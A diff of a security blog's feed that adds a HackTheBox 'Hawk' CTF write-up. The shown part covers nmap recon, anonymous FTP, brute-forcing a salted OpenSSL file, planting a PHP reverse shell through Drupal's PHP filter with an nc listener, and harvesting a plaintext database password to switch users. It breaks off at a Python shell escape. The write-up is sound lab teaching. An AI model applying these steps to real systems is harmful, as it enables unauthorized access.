@@ -1,4 +1,350 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-11-26T17:57:30+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">BoiteAKlou’s Infosec Blog</title><subtitle>Computer security oriented blog held by a french student in IT and Networks. This blog aims at teaching the fundamentals of Cyber Security to beginners through CTF write-ups and didactic articles.</subtitle><author><name>BoiteAKlou</name></author><entry><title type="html">Linux Privilege Escalation: Abusing shared libraries</title><link href="http://localhost:4000/Abusing-Shared-Libraries.html" rel="alternate" type="text/html" title="Linux Privilege Escalation: Abusing shared libraries" /><published>2018-11-21T13:00:00+01:00</published><updated>2018-11-21T13:00:00+01:00</updated><id>http://localhost:4000/Abusing-Shared-Libraries</id><content type="html" xml:base="http://localhost:4000/Abusing-Shared-Libraries.html">&lt;p&gt;Linux applications often use dynamically linked shared object libraries. These libraries allow code flexbility but they have their drawbacks… &lt;span style=&quot;color:Maroon&quot;&gt;In this article, we will study the weaknesses of shared libraries and how to exploit them in many different ways.&lt;/span&gt; Each exploit will be illustrated by a concrete example, which should make you understand how to reproduce it. I’ll give recommandations on how to protect your system against it in the final part of the article.
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-12-01T22:24:07+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">BoiteAKlou’s Infosec Blog</title><subtitle>Computer security oriented blog held by a french student in IT and Networks. This blog aims at teaching the fundamentals of Cyber Security to beginners through CTF write-ups and didactic articles.</subtitle><author><name>BoiteAKlou</name></author><entry><title type="html">HackTheBox: Hawk writeup</title><link href="http://localhost:4000/HackTheBox-Hawk.html" rel="alternate" type="text/html" title="HackTheBox: Hawk writeup" /><published>2018-12-01T22:00:00+01:00</published><updated>2018-12-01T22:00:00+01:00</updated><id>http://localhost:4000/HackTheBox-Hawk</id><content type="html" xml:base="http://localhost:4000/HackTheBox-Hawk.html">&lt;p&gt;Hawk has been retired from HackTheBox active machines so here is my writeup explaining how I rooted this machine.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-12-01/hawk-box.png&quot; alt=&quot;Hawk box&quot; title=&quot;Hawk Box&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;In this article, we will crack a &lt;strong&gt;salted OpenSSL encrypted file&lt;/strong&gt;, upload a reverse shell to an instance of &lt;strong&gt;Drupal 7 CMS&lt;/strong&gt;. Then, we will use a &lt;strong&gt;SSH port-forwarding&lt;/strong&gt; trick to access a &lt;strong&gt;H2 database console&lt;/strong&gt; disallowing remote connections and exploit this app to get root on the machine. Enjoy your reading!
+ &lt;!--excerpt--&gt;&lt;/p&gt;
+
+&lt;h2 class=&quot;no_toc&quot; id=&quot;table-of-contents&quot;&gt;Table of Contents&lt;/h2&gt;
+
+&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#initial-foothold-and-user-access&quot; id=&quot;markdown-toc-initial-foothold-and-user-access&quot;&gt;Initial Foothold And User Access&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#recon&quot; id=&quot;markdown-toc-recon&quot;&gt;Recon&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#ftp-anonymous-login&quot; id=&quot;markdown-toc-ftp-anonymous-login&quot;&gt;FTP Anonymous Login&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#salted-openssl-decryption&quot; id=&quot;markdown-toc-salted-openssl-decryption&quot;&gt;Salted OpenSSL Decryption&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#drupal-reverse-shell-upload&quot; id=&quot;markdown-toc-drupal-reverse-shell-upload&quot;&gt;Drupal Reverse Shell Upload&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#stored-credentials-retrieval&quot; id=&quot;markdown-toc-stored-credentials-retrieval&quot;&gt;Stored credentials retrieval&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#python-shell-escape&quot; id=&quot;markdown-toc-python-shell-escape&quot;&gt;Python Shell Escape&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#elevating-privileges&quot; id=&quot;markdown-toc-elevating-privileges&quot;&gt;Elevating privileges&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#enumeration&quot; id=&quot;markdown-toc-enumeration&quot;&gt;Enumeration&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#ssh-port-forwarding&quot; id=&quot;markdown-toc-ssh-port-forwarding&quot;&gt;SSH Port Forwarding&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#h2-database-console&quot; id=&quot;markdown-toc-h2-database-console&quot;&gt;H2 Database Console&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#getting-a-root-shell&quot; id=&quot;markdown-toc-getting-a-root-shell&quot;&gt;Getting a Root Shell&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;initial-foothold-and-user-access&quot;&gt;Initial Foothold And User Access&lt;/h2&gt;
+
+&lt;h3 id=&quot;recon&quot;&gt;Recon&lt;/h3&gt;
+
+&lt;p&gt;As with every machine, we only know its &lt;strong&gt;IP address&lt;/strong&gt; so we have to start with &lt;strong&gt;the reconnaissance phase&lt;/strong&gt;. &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; is always a weapon of choice for this.&lt;/p&gt;
+
+&lt;p&gt;Let’s start with &lt;strong&gt;a basic scan using default scripts&lt;/strong&gt; (-sC option). We will run a deeper scan if nothing is found.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; nmap/Hawk 10.10.10.102
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
+PORT     STATE SERVICE REASON  VERSION
+21/tcp   open  ftp     syn-ack vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;FTP code 230&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_drwxr-xr-x    2 ftp      ftp          4096 Jun 16 22:21 messages
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to ::ffff:10.10.14.20
+|      Logged &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ssh-hostkey:
+|   2048 e4:0c:cb:c5:a5:91:78:ea:54:96:af:4d:03:e4:fc:88 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBj1TNZ7AO3WSpSMz0UoHlGmWQRlvXcyMXMRhDJ8X+9kZZGKkdXxWcDAu/OvUXdwCKVY+YjPPY8wi+jqKIQXlgICA3MEcg3RlLoHPTUh6KFmPxlT7Heaca7xSJ+BnhFxYF+bhhiaHgcaK8qlZFc9qS2Un3oNS6VDAAHOx2p4FU8OVM/yuik9qt6nxAQVS/v3mZfpVUm3HKOOcfXzyZEZAwrAWHk+2Y2yCBUUY1AmCMed566BfmeEOYXJU18I92fsSOhuzTt7tqX4u66SO1cyLTJczSA7gF42K8O+VPyn3pWnLmMBnAcZS0KbMUKVPa3UBSScxl5nLlSFRyJ1rCBxs7
+|   256 95:cb:f8:c7:35:5e:af:a9:44:8b:17:59:4d:db:5a:df &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM0hCdwqpZ6zvQpLiZ5/tsUDQeVMEXicRx6H8AOW8lyzsHJrrQWgqM1vo5jKUn+bMazqzZ1SbP8QJ3JDS2/SlHs&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
+|   256 4a:0b:2e:f7:1d:99:bc:c7:d3:0b:91:53:b9:3b:e2:79 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIF3kNN27mM1080x8c4aOWptSRg6yN21uBMSQiKk1PrsP
+80/tcp   open  http    syn-ack Apache httpd 2.4.29 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+|_http-favicon: Unknown favicon MD5: CF2445DCB53A031C02F9B57E2199BC03
+|_http-generator: Drupal 7 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://drupal.org&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+| http-robots.txt: 36 disallowed entries
+| /includes/ /misc/ /modules/ /profiles/ /scripts/
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
+| /LICENSE.txt /MAINTAINERS.txt /update.php /UPGRADE.txt /xmlrpc.php
+| /admin/ /comment/reply/ /filter/tips/ /node/add/ /search/
+| /user/register/ /user/password/ /user/login/ /user/logout/ /?q&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;admin/
+| /?q&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;comment/reply/ /?q&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;filter/tips/ /?q&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;node/add/ /?q&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;search/
+|_/?q&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;user/password/ /?q&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;user/register/ /?q&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;user/login/ /?q&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;user/logout/
+|_http-server-header: Apache/2.4.29 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-title: Welcome to 192.168.56.103 | 192.168.56.103
+8082/tcp open  http    syn-ack H2 database http console
+|_http-favicon: Unknown favicon MD5: 8EAA69F8468C7E0D3DFEF67D5944FF4D
+| http-methods:
+|_  Supported Methods: GET POST
+|_http-title: H2 Console
+Service Info: OSs: Unix, Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Very interesting results! We have an &lt;strong&gt;FTP server allowing anonymous login&lt;/strong&gt;, an &lt;strong&gt;SSH server&lt;/strong&gt;, an &lt;strong&gt;Apache web server&lt;/strong&gt; running &lt;strong&gt;Drupal 7 CMS&lt;/strong&gt; and a &lt;strong&gt;H2 database console&lt;/strong&gt;. Let’s dig into all of this!&lt;/p&gt;
+
+&lt;h3 id=&quot;ftp-anonymous-login&quot;&gt;FTP Anonymous Login&lt;/h3&gt;
+
+&lt;p&gt;We can connect to the ftp server using the name &lt;em&gt;anonymous&lt;/em&gt; without password. While exploring the only available directory, we have found a hidden file named &lt;em&gt;.drupal.txt.enc&lt;/em&gt;, that we have downloaded.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ftp 10.10.10.102
+Connected to 10.10.10.102.
+220 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;vsFTPd 3.0.3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.102:boiteaklou&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: anonymous
+230 Login successful.
+Remote system &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;is UNIX.
+Using binary mode to transfer files.
+ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
+200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    3 ftp      ftp          4096 Jun 16 22:14 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+drwxr-xr-x    3 ftp      ftp          4096 Jun 16 22:14 ..
+drwxr-xr-x    2 ftp      ftp          4096 Jun 16 22:21 messages
+226 Directory send OK.
+ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;messages
+250 Directory successfully changed.
+ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
+200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 ftp      ftp          4096 Jun 16 22:21 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+drwxr-xr-x    3 ftp      ftp          4096 Jun 16 22:14 ..
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;    1 ftp      ftp           240 Jun 16 22:21 .drupal.txt.enc
+226 Directory send OK.
+ftp&amp;gt; get .drupal.txt.enc
+&lt;span class=&quot;nb&quot;&gt;local&lt;/span&gt;: .drupal.txt.enc remote: .drupal.txt.enc
+200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful. Consider using PASV.
+150 Opening BINARY mode data connection &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; .drupal.txt.enc &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;240 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+226 Transfer complete.
+240 bytes received &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.00 secs &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.3842 MB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;salted-openssl-decryption&quot;&gt;Salted OpenSSL Decryption&lt;/h3&gt;
+
+&lt;p&gt;As its suffix suggests it, this file is &lt;strong&gt;encrypted&lt;/strong&gt;. We can verify that using the &lt;code class=&quot;highlighter-rouge&quot;&gt;file&lt;/code&gt; program.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file .drupal.txt.enc
+.drupal.txt.enc: openssl enc&lt;span class=&quot;s1&quot;&gt;'d data with salted password, base64 encoded
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;It is also &lt;strong&gt;base64 encoded&lt;/strong&gt; so we decode it using the following command:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; .drupal.txt.enc | base64 &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; drupal.txt.enc
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;After a bit of research, I found a tool on &lt;a href=&quot;https://github.com/glv2/bruteforce-salted-openssl&quot;&gt;github&lt;/a&gt; called &lt;em&gt;bruteforce-salted-openssl&lt;/em&gt; which revealed itself very effective.
+I used it with the classical &lt;em&gt;rockyou.txt&lt;/em&gt; wordlist:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;bruteforce-salted-openssl &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 8 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; rockyou.txt &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 30 &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; SHA256 drupal.txt.enc
+Warning: using dictionary mode, ignoring options &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; and &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+
+Tried passwords: 29
+Tried passwords per second: inf
+Last tried password: 1234567890
+
+Password candidate: friends
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;span style=&quot;color:Green&quot;&gt;Perfect! We have the password.&lt;/span&gt; We can now use &lt;strong&gt;OpenSSL&lt;/strong&gt; to decipher the file:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;openssl enc &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-aes-256-cbc&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-pass&lt;/span&gt; pass:friends &lt;span class=&quot;nt&quot;&gt;-in&lt;/span&gt; drupal.txt.enc
+Daniel,
+
+Following the password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the portal:
+
+PencilKeyboardScanner123
+
+Please &lt;span class=&quot;nb&quot;&gt;let &lt;/span&gt;us know when the portal is ready.
+
+Kind Regards,
+
+IT department
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;It looks like we’ve found credentials for a certain portal.&lt;/p&gt;
+
+&lt;h3 id=&quot;drupal-reverse-shell-upload&quot;&gt;Drupal Reverse Shell Upload&lt;/h3&gt;
+
+&lt;p&gt;Drupal is an Open-Source Content Management System.&lt;/p&gt;
+
+&lt;p&gt;Browsing to &lt;a href=&quot;http://10.10.10.102:80&quot;&gt;http://10.10.10.102:80&lt;/a&gt;, we are facing a login page.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-12-01/drupal-login.png&quot; alt=&quot;Drupal login&quot; title=&quot;Drupal login&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Trying a couple common usernames, we quickly found out that &lt;strong&gt;“admin”&lt;/strong&gt; was the right one to combine with the password we just deciphered.&lt;/p&gt;
+
+&lt;p&gt;Once logged in, all we have to do is to &lt;span style=&quot;color:Red&quot;&gt;enable phpfilters&lt;/span&gt; and to &lt;span style=&quot;color:Red&quot;&gt;create a new article with our php reverse shell payload inside.&lt;/span&gt; I’ll detail all these steps right below.&lt;/p&gt;
+
+&lt;p&gt;First of all, we have to &lt;span style=&quot;color:DarkOrchid&quot;&gt;setup a local listener&lt;/span&gt; for our reverse shell:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 9999
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 9999 ...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now, we have to &lt;span style=&quot;color:Red&quot;&gt;enable phpfilters in order to be able to execute PHP code inside articles.&lt;/span&gt; Once logged in as admin, go to &lt;strong&gt;Configuration &amp;gt; Content Authoring &amp;gt; Text formats&lt;/strong&gt; and tick &lt;strong&gt;“PHP Evaluator”&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-12-01/drupal-phpfilter.png&quot; alt=&quot;Drupal phpfilter&quot; title=&quot;Drupal phpfilter&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Then, we can add a new article and place our &lt;strong&gt;PHP reverse shell payload&lt;/strong&gt; inside.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-12-01/drupal-add-article.png&quot; alt=&quot;Drupal add article&quot; title=&quot;Drupal add article&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Also, don’t forget to &lt;span style=&quot;color:Red&quot;&gt;set the text format of the article to “PHP Code”&lt;/span&gt; at the bottom the page:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-12-01/drupal-textformat.png&quot; alt=&quot;Drupal textformat&quot; title=&quot;Drupal text-format&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The reverse shell should be coming back to our machine now:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 9999
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 9999 ...
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.20] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.102] 38992
+/bin/sh: 0: can t access tty&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; job control turned off
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;id
+&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Very nice! Being connected as &lt;strong&gt;www-data&lt;/strong&gt; is not enough for the user flag unfortunately. &lt;span style=&quot;color:MediumSlateBlue&quot;&gt;We must find a way to connect as a real user!&lt;/span&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;stored-credentials-retrieval&quot;&gt;Stored credentials retrieval&lt;/h3&gt;
+
+&lt;p&gt;First, let’s &lt;span style=&quot;color:Green&quot;&gt;upgrade this horrible shell to a bash&lt;/span&gt;:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'import pty;pty.spawn(&quot;/bin/bash&quot;)'&lt;/span&gt;
+www-data@hawk:/var/www/html&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;After a bit of digging, I found what seems to be &lt;strong&gt;a plaintext password&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@hawk:/var/www/html&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Ri&lt;/span&gt; password
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
+sites/default/settings.php:      &lt;span class=&quot;s1&quot;&gt;'password'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'drupal4hawk'&lt;/span&gt;,
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Having a look at &lt;em&gt;/home/&lt;/em&gt;, we can see that &lt;em&gt;daniel&lt;/em&gt; is our potential target. Let’s see if we can &lt;code class=&quot;highlighter-rouge&quot;&gt;su&lt;/code&gt; as &lt;em&gt;daniel&lt;/em&gt; with this password:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@hawk:/var/www/html&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su daniel
+su daniel
+Password: drupal4hawk
+
+Python 3.6.5 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;default, Apr  1 2018, 05:46:30&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;GCC 7.3.0] on linux
+Type &lt;span class=&quot;s2&quot;&gt;&quot;help&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;copyright&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;credits&quot;&lt;/span&gt; or &lt;span class=&quot;s2&quot;&gt;&quot;license&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;more information.
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;It’s working but &lt;span style=&quot;color:Red&quot;&gt;we’re popping inside a python shell!&lt;/span&gt; Surprising, even though it shouldn’t be too difficult to escape.&lt;/p&gt;
+
+&lt;h3 id=&quot;python-shell-escape&quot;&gt;Python Shell Escape&lt;/h3&gt;
+
+&lt;p&gt;Actually, we can use the same technique we used to upgrade from &lt;strong&gt;/bin/sh&lt;/strong&gt; to &lt;strong&gt;/bin/bash&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Python 3.6.5 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;default, Apr  1 2018, 05:46:30&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
